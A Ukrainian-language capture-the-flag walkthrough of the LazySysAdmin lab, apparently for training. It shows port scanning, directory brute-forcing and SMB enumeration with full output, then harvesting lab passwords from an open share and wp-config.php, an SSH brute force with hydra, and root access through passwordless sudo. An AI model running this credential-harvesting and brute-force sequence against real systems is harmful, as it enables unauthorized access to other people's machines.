### **Крок 1: Розвідка мережі та сканування портів (Enumeration)**
```sh
netdiscover -r 192.168.160.0/24
```
![alt text](./Images/image1.png)

```sh
nmap -sC -sV -Pn -p- 192.168.160.253
```
**Результат**:  
- **Port 22**: SSH (OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)).
- **Port 80**: HTTP (Apache httpd 2.4.7 (Ubuntu).  
- **Port 139**: netbios-ssn (Samba smbd 3.X - 4.X (workgroup: WORKGROUP)).
- **Port 445**: netbios-ssn (Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)).
- **Port 3306**: mysql (MySQL (unauthorized)).
- **Port 3337**: irc (InspIRCd).

![alt text](./Images/image2.png)

![alt text](./Images/image3.png)

---

### **Крок 2: Веб-розвідка та пошук прихованих директорій**

Відкриваємо в браузері `http://192.168.160.253`.

![alt text](./Images/image4.png)

Виконаємо перебір каталогів за допомогою команди **dirb**:
```sh
dirb http://192.168.160.253
```
**Результат**:
- Встановлений WordPress за шляхом **/wordpress**
- Доступна функція **phpinfo()** за шляхом **/info.php**
- Встановлений веб-інтерфейс **phpMyAdmin**

![alt text](./Images/image5.png)

![alt text](./Images/image6.png)

![alt text](./Images/image7.png)

---

### **Крок 3: Дослідження WordPress**

![alt text](./Images/image8.png)

передивляємось повідомлення форума:

![alt text](./Images/image9.png)

Єдиний висновок - адмін залишив обліковий запис за замовчанням. Тобто можна спробувати **wpscan** з брутфорсом за словником.

---

### **Крок 4: Дослідження сервісу SMB (Самба)**

```sh
enum4linux -a 192.168.160.253
```
```plaintext
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 21 14:19:37 2026
 ==========================( Target Information )==========================
Target ........... 192.168.160.253
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ===========( Enumerating Workgroup/Domain on 192.168.160.253 )===========
[+] Got domain/workgroup name: WORKGROUP
 ==============( Nbtstat Information for 192.168.160.253 )===============
Looking up status of 192.168.160.253
        LAZYSYSADMIN    <00> -         B <ACTIVE>  Workstation Service
        LAZYSYSADMIN    <03> -         B <ACTIVE>  Messenger Service
        LAZYSYSADMIN    <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00
 ==================( Session Check on 192.168.160.253 )==================
[+] Server 192.168.160.253 allows sessions using username '', password ''

 ==============( Getting domain SID for 192.168.160.253 )==============
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup                                                                                        
                                                                                                                                                          
 =================( OS information on 192.168.160.253 )=================
[E] Can't get OS info with smbclient                                                                                                                        
[+] Got OS info for 192.168.160.253 from srvinfo:                                                                                                           
        LAZYSYSADMIN   Wk Sv PrQ Unx NT SNT Web server                                                                                                      
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
 ======================( Users on 192.168.160.253 )======================
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                     
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
 ===============( Share Enumeration on 192.168.160.253 )===============
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        Workgroup            Master
        ---------            -------
        WORKGROUP            LAZYSYSADMIN

[+] Attempting to map shares on 192.168.160.253                                                                                                             
                                                                                                                                                            
//192.168.160.253/print$        Mapping: DENIED Listing: N/A Writing: N/A                                                                                   
//192.168.160.253/share$        Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                              
                                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                  
//192.168.160.253/IPC$  Mapping: N/A Listing: N/A Writing: N/A
 ==========( Password Policy Information for 192.168.160.253 )==========                                                                                                                                                            
Password:                                                                                                                                                   
[+] Attaching to 192.168.160.253 using a NULL share
[+] Trying protocol 139/SMB...
[+] Found domain(s):
        [+] LAZYSYSADMIN
        [+] Builtin
[+] Password Info for Domain: LAZYSYSADMIN
        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set
[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                                                                                                                                                                                                                                                                
Password Complexity: Disabled                                                                                                                               
Minimum Password Length: 5
 ====================( Groups on 192.168.160.253 )====================                                                                                                                                                                                                                                                                                                                        
[+] Getting builtin groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                         
[+]  Getting builtin group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                          
[+]  Getting local group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                               
[+]  Getting domain groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                         
[+]  Getting domain group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                              
 ====( Users on 192.168.160.253 via RID cycling (RIDS: 500-550,1000-1050) )====
[I] Found new SID:                                                                                                                                          
S-1-22-1                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                 
                                                                                                                                                            
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
                                                                                                                                                            
S-1-22-1-1000 Unix User\togie (Local User)                                                                                                                  

[+] Enumerating users using SID S-1-5-21-2952042175-1524911573-1237092750 and logon username '', password ''                                                
S-1-5-21-2952042175-1524911573-1237092750-501 LAZYSYSADMIN\nobody (Local User)                                                                              
S-1-5-21-2952042175-1524911573-1237092750-513 LAZYSYSADMIN\None (Domain Group)

 ===============( Getting printer info for 192.168.160.253 )===============
No printers returned.                                                                                                                                       
enum4linux complete on Wed Oct 21 14:19:51 2026
```

**Результат**:
Маємо обліковий запис локального користувача: **S-1-22-1-1000 Unix User\togie (Local User)**

Спробуємо зайти на самбу

![alt text](./Images/image10.png)

![alt text](./Images/image11.png)

![alt text](./Images/image12.png)

Переглядаємо зміст файлів з метою отримання корисної інформації, особливу увагу приділяємо файлу **deets.txt**

**Результат**:
**Password: 12345**

![alt text](./Images/image13.png)

Також маємо корисну інформацію у файлі **wp-config.php**

**Результат**:
**DB_PASSWORD: TogieMYSQL12345^^**

![alt text](./Images/image14.png)

---

### **Крок 5: Дослідження ssh**

Робимо спробу брутфорса ssh, бо маємо логін користувача:
```sh
hydra 192.168.160.253 -t 4 -l togie -P /usr/share/wordlists/rockyou.txt ssh
```
**Результат**:  
**[22][ssh] host: 192.168.160.253   login: togie   password: 12345**.

![alt text](./Images/image15.png)

Спробуємо залогінитися через **SSH**
```sh
ssh togie@192.168.160.253
```
**Результат**:  
Успішний вхід

![alt text](./Images/image16.png)

Перевіряємо дозволи:
```sh
sudo -l
```
**Результат**:  
Користувач **togie** має права виконання від **root** без введення паролю

![alt text](./Images/image17.png)

Вводимо команду
```sh
sudo -i
```
**Результат**:
Перейшли на **root** користувача

![alt text](./Images/image18.png)

Досліджуємо домашню директорію рута та бачимо цікавий файл, виводимо його зміст

**Результат**:
Ми пройшли **LazySysAdmin**

![alt text](./Images/image19.png)

---
